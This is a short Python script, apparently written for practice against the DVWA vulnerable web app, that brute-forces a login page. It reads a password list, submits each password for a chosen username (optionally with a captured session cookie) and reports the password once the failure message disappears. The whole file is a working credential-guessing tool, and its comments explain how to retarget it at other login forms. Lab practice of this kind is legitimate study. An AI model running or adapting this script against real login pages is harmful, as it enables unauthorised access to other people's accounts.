# Login page bruteforce, 2021
# made for Metasploit DVWA. Will have to be changed for different pages. Will update down the line.

# --- Libraries ---
import requests
from termcolor import colored


# User input
url = input("[+] Enter Page URL: ")
username = input("[+] Enter Username For The Account To Bruteforce: ")
password_file = input("[+] Enter Password File To Use: ")
login_failed_string = input("[+] Enter Sting That Appears On Failed Login: ")
cookie_value = input("[+] Enter Cookie Value (Optional): ") # Burpsuite cookie value for CSRF exploit

# cracking function
def cracking(username,url):
    for password in passwords:
        password = password.strip()
        print(colored(("Trying: " + password), "red"))
        data = {"username":username, "password":password,"Login":"Submit"} # "username" and "password" will vary between web pages. Must be changed to reflect target source code. Get name variable from source
        if cookie_value != "": # Checks if cookie value is entered
            response = requests.get(url,params={"username":username, "password":password,"Login":"Login"}, cookies = {"cookie" : cookie_value}) # GET because DVWA uses it. Will need to change in universal program
        else:
            response = requests.post(url, data=data)
        if login_failed_string in response.content.decode():
            pass
        else:
            print(colored(("[+] Found Username: ==> " + username), "green"))
            print(colored(("[+] Found Password: ==> " + password), "green"))
            exit()


# Opening password file
with open(password_file, "r") as passwords:
    cracking(username,url)

print(colored(("[!!] Password Not In Passwords File"), "red"))